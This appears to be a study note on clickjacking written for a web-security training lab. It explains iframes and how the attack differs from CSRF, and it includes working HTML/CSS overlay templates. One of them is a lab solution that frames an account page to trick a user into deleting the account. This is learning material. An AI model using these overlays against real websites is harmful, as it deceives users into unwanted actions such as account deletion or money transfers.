
Is a interface based attack, where user is `tricked` into clicking on a obfuscated prompt to perform a hidden and unwanted action.

This attack is somewhat similar to `CSRF` attack.
But the difference is that clickjacking requires the `user interaction` such as clicking on a hidden button, compared to forging a whole new request like in CSRF without any user interaction.

For example you receive and `email` saying you won 10 gazillion dollars.
You click the `link` and there is a button to claim your prize.
Hidden underneath that is a button that is from another web app to transfer your money to attackers account.

That button you just clicked is within an `iframe` which is overlaid on top of the button you are actually clicking.


`iframe` - inline frame is an html element that allows you to embed another document into the current HTML.

```html
<!DOCTYPE html>
<html>
<body>
<iframe src="https://www.w3schools.com" title="W3Schools Free Online Web Tutorials"></iframe>
</body>
</html>
```
In this example the iframe is a little window rendering what the URL as if you visited it normally.

As we learned in CSRF note, CSRF tokens are used to prevent forged requests from going thru via token or same origin headers and else.
In this case with clickjacking non of that matters because the request happening on the `actual domain`.
The request looks all like normal behavior except the part that process occurs within an `iframe`.


#### Basic clickjacking attack

Clickjacking utilizes `CSS` to create and manipulate layers.
The target website is incorporated into an iframe overlaid on top of a decoy website.

In other words we "steal" a button from a legit website, stick it into our decoy to trick the user into clicking it.
```html
<head> 
<style>
#target_website 
{ position:relative; width:128px; height:128px; opacity:0.00001; z-index:2; }

#decoy_website
{ position:absolute; width:300px; height:400px; z-index:1; }
</style>
</head> ...
<body>
<div id="decoy_website"> ...decoy web content here... </div> <iframe id="target_website" src="https://vulnerable-website.com"> </iframe>
</body>
```

As you can tell by the CSS settings.
The `relative and absolute position` are set to achieve proper overlap.
And `opacity` is set to basically invisible value of `0.00001` which if set to `0.0` could trigger browsers anti clickjacking protection, depending on browser and version.
Also `z-index`  is a and indicator of z axis, what should be on top, the higher the number the higher the item is on top.

**LAB** - craft some HTML that frames the account page and fools the user into deleting their account.

```html
<style>
    iframe {
        position:relative;
        width:200px;
        height: 600px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:495px;
        left:75px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a190054039c9af780470dd8002600bc.web-security-academy.net/my-account"></iframe>
```

So we have an iframe and a div.
They are stylized with CSS, iframe is positioned relatively and has got a z-index higher than div underneath it.
Div is placed with lower z-index value and is just a "fake button" that is positioned where the iframe button appears to be.